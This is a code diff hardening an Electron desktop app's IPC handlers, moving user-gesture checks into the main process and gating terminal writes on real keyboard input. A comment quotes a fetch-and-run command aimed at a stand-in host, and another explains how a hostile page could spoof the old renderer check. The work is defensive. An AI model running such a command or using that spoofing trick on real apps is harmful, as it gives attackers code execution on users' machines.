@@ -52,6 +52,7 @@ import { listSites } from '@/main/browser-sites'
 import { isSafeInternalPath } from '@/main/config'
 import type { DesktopSettingsService } from '@/main/desktop-settings'
 import { isDesktopPreferenceKey } from '@/main/desktop-settings'
+import { hasRecentDeliberateInput, hasRecentDiscreteInput } from '@/main/input-activity'
 import type { LocalFilesystemService } from '@/main/local-filesystem'
 import { isAppOrigin, openExternalSafe } from '@/main/navigation'
 import type { TerminalService } from '@/main/terminal'
@@ -267,6 +268,12 @@ type ChannelSpec =
     })
   | (ChannelSpecBase & {
       kind: 'send'
+      /**
+       * Requires the user to have recently driven this renderer with real OS
+       * input. For channels whose legitimate caller is a person operating a
+       * widget, where a background script must not be able to call at will.
+       */
+      needsDeliberateInput?: boolean
       handler: (...args: unknown[]) => void
     })
 
@@ -307,14 +314,18 @@ function localFilesystemRequestNeedsToolAuthorization(request: unknown): boolean
   )
 }
 
-async function rendererHasActiveUserGesture(event: IpcMainInvokeEvent): Promise<boolean> {
-  const frame = event.senderFrame
-  if (!frame || typeof frame.executeJavaScript !== 'function') return false
-  try {
-    return (await frame.executeJavaScript('navigator.userActivation?.isActive === true')) === true
-  } catch {
-    return false
-  }
+/**
+ * Whether the caller has a real user gesture behind it.
+ *
+ * Answered from the main process's own record of OS input, never by asking the
+ * renderer. The previous implementation ran
+ * `navigator.userActivation?.isActive === true` through
+ * `frame.executeJavaScript`, which evaluates in the page's main world — the
+ * same world as the compromised page this gate exists to stop, which need only
+ * redefine `navigator.userActivation` to make the check always pass.
+ */
+function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
+  return hasRecentDiscreteInput(event.sender)
 }
 
 interface DesktopToolAuthorization {
@@ -918,6 +929,16 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'send',
       gate: 'app-origin',
       requires: 'terminal',
+      // A raw PTY write submits a command line on the trailing `\r`, so this is
+      // the one channel where the app origin alone is not enough: an XSS'd or
+      // hostile origin would otherwise reach arbitrary command execution with
+      // `write(id, 'curl evil.sh|sh\r')`. `terminal:execute-tool` is bound to a
+      // server-authorized Copilot tool call; this is the interactive path, whose
+      // only legitimate caller is a person typing into xterm.js — so it is gated
+      // on the main process having seen that person's keystrokes. Panel focus is
+      // deliberately not used: `terminal:focused` is a renderer-asserted claim
+      // the same attacker can set.
+      needsDeliberateInput: true,
       handler: (terminalId, data) => {
         if (typeof terminalId === 'string' && typeof data === 'string') {
           deps.terminal.write(terminalId, data)
@@ -972,7 +993,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     if (spec.kind === 'invoke') {
       ipcMain.handle(channel, async (event, ...args) => {
         if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return spec.denied
-        if (spec.needsUserActivation && !(await rendererHasActiveUserGesture(event))) {
+        if (spec.needsUserActivation && !senderHasUserGesture(event)) {
           return spec.denied
         }
         let handlerArgs = args
@@ -1013,7 +1034,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         if (
           channel === 'desktop:local-filesystem' &&
           localFilesystemRequestNeedsUserActivation(args[0]) &&
-          !(await rendererHasActiveUserGesture(event))
+          !senderHasUserGesture(event)
         ) {
           return {
             ok: false,
@@ -1039,9 +1060,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       })
     } else {
       ipcMain.on(channel, (event, ...args) => {
-        if (senderAllowed(event, spec.gate) && featureAllowed(spec.requires)) {
-          spec.handler(...(spec.passSender ? [event.sender, ...args] : args))
-        }
+        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
+        if (spec.needsDeliberateInput && !hasRecentDeliberateInput(event.sender)) return
+        spec.handler(...(spec.passSender ? [event.sender, ...args] : args))
       })
     }
   }
